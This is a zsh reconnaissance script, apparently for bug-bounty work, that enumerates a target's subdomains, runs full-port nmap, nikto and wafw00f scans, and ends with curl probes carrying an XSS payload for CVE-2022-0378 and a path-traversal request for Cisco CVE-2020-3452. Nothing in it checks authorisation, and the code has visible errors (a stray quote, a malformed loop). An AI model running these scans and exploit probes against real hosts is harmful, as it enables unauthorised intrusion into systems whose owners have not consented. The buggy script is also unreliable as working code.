#!/usr/bin/zsh
#
# Make sure to ....           chmod +x <this-file.sh>
# Go get sub-domains!
# TODO LATER ask user "Would you like to Brute-Force sub-domains as well? Y/N? <wordlist>" 
# like: Y "/home/user/wordlists/subdomain-top-1-mil.txt"

amass enum -d $1 -oA amsssenumsublist
sleep 10
subfinder -d $1 -o sfresults.txt

# Combine lists of sub-domains.
# TODO Turn the lists into VAR

for i in $(ls | grep ".txt"); 
do 
	cat $i | sort amsssenumsublist.txt sfresults.txt | uniq > sorted-sub-domains.txt; 
done


while read line;
do
	host "$line";
done<"sorted-sub-domains.txt" | grep "has add" | cut -d" " -f4 > sortedips.txt;


FILE="sortedips.txt"
if test -f "$FILE"; 
then
	sort "$FILE" | uniq -u > ips4nmap.txt;
fi

nmap -A -p- -iL ips4nmap.txt -oS "nmap-A-p-iL-result"

cat sorted-sub-domains.txt | httpx > urls.txt
sleep 10

echo "Looking good so far !!! "
 
mkdir ips sub-domains urls nmap scans
sleep 1

mv urls.txt urls/
sleep 1

mv ips4nmap.txt sortedips.txt ips/
sleep 1

mv sorted-sub-domains.txt amsssenumsublist.txt sfresults.txt sub-domains/
sleep 1

mv nmap-A-p-iL-result*" nmap-results/
sleep 1


# Go into sub-domains and run nikto loop script!

nikto-loop sub-domains/sorted-sub-domains.txt

# check if nikto-loop succeeded and mv files (*html) to new dir nikto-results-n-html
if [ $? -ne 0 ]; then
    mkdir nikto-results-n-html/ && mv *.html nikto-results-n-html/
fi

# Use wafw00f to identify Web Application Firewall
cat sorted-sub-domains.txt | xargs -I{} wafw00f {} > wafw00f-results-4-all

# Next we will use our active 'urls/urls.txt' list and check for CVE-2022-0378 !!! Still needa learn how to XSS !
cat urls/urls.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done > vuln-2-CVE-2022-0378

# CVE-2020-3452
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < in-scope.txt > vuln-2-CVE-2020-3452

